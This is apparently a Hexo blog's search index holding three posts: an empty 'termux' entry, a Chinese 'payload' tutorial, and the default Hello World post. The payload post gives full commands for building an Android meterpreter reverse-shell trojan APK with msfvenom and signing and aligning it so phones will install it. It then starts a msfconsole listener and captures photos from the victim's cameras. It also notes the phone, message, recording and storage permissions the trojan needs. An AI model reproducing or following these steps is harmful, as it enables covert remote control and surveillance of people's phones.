<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>termux</title>
      <link href="/2020/08/18/termux/"/>
      <url>/2020/08/18/termux/</url>
      
        <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>payload</title>
      <link href="/2020/08/18/payload/"/>
      <url>/2020/08/18/payload/</url>
      
        <content type="html"><![CDATA[<h2 id="开启端口"><a href="#开启端口" class="headerlink" title="开启端口"></a>开启端口</h2><p>打开终端，安装ufw防火墙，开启5555端口</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install ufw</span><br><span class="line">sudo ufw <span class="built_in">enable</span></span><br><span class="line">sudo ufw allow 5555</span><br></pre></td></tr></tbody></table></figure><h2 id="生成payload-apk文件"><a href="#生成payload-apk文件" class="headerlink" title="生成payload apk文件"></a>生成payload apk文件</h2><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.220 LPORT=5555 R &gt; ./a.apk</span><br></pre></td></tr></tbody></table></figure><p>生成apk后还需用到一下工具优化:<br>1.keytools (密钥、证书管理工具)<br>2.Jarsigner(jar签名、校验工具)<br>3.Zipalign(APK优化攻击)需安装</p><hr><ul><li>首先使用keytools生成创建证书:</li></ul><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keytool -genkey -v -keystore apk-trojan-key.keystore -<span class="built_in">alias</span> newbie -keyalg RSA -keysize 1024 -validity 999</span><br></pre></td></tr></tbody></table></figure><p>-v 显示密钥库中的证书详细信息<br>-k eystore 指定密钥库的名称<br>-alias 产生别名<br>-keyalg 指定密钥的算法(默认为DSA)<br>-keysize 指定密钥长度<br>-validity 指定创建的证书有效期多少天(默认90)</p><hr><ul><li><p>然后使用jarsigner进行签名:</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore apk-trojan-key.keystore newbie.apk newbie</span><br></pre></td></tr></tbody></table></figure></li><li><p>verbose 签名/验证时输出详细信息</p></li><li><p>sigalg  签名算法的名称</p></li><li><p>digestalg 摘要算法的名称</p></li><li><p>keystore 密钥库位置<br><code>进行签名文件+别名</code></p></li><li><p>使用-verify对文件签名验证</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jarsigner -verify -verbose newbie.apk</span><br></pre></td></tr></tbody></table></figure></li></ul><hr><ul><li>使用Zipalign优化apk (缺少这一步可能导致部分手机会无法安装)<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zipalign -v 4 newbie.apk  newbie1.apk</span><br></pre></td></tr></tbody></table></figure></li></ul><hr><h2 id="开始监听"><a href="#开始监听" class="headerlink" title="开始监听"></a>开始监听</h2><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">use exploit/multi/handler //加载攻击模块</span><br><span class="line"><span class="built_in">set</span> payload android/meterpreter/reverse_tcp  //选择要使用的Payload</span><br><span class="line"><span class="built_in">set</span> LHOST 192.168.0.113</span><br><span class="line"><span class="built_in">set</span> LPORT 5555</span><br><span class="line">show options  //查看需要设置的参数</span><br><span class="line"></span><br><span class="line">//注意被侵入对象需要给我们的木马文件一些权限，诸如访问电话，信息，录音，相机，手机存储等权限</span><br><span class="line">exploit  //执行</span><br></pre></td></tr></tbody></table></figure><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">webcam_snap -i 1//前置摄像头采集照片</span><br><span class="line">webcam_snap -i 2 //后置摄像头采集照片</span><br></pre></td></tr></tbody></table></figure><p>注意:<code>当有一会时间未及时操作便出现会连接超时，用户需再次点击木马文件，才能继续操作.</code></p><hr><h2 id="查看可以使用的payload类型"><a href="#查看可以使用的payload类型" class="headerlink" title="查看可以使用的payload类型"></a>查看可以使用的payload类型</h2><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -l payloads | more</span><br></pre></td></tr></tbody></table></figure><hr><p>参考:<br><a href="https://blog.csdn.net/qq_41453285/article/details/93536347">https://blog.csdn.net/qq_41453285/article/details/93536347</a></p><p><a href="https://www.jianshu.com/p/e63006a24603">https://www.jianshu.com/p/e63006a24603</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Payload </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> Payload </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/1970/01/01/hello-world/"/>
      <url>/1970/01/01/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></tbody></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo server</span><br></pre></td></tr></tbody></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo generate</span><br></pre></td></tr></tbody></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo deploy</span><br></pre></td></tr></tbody></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
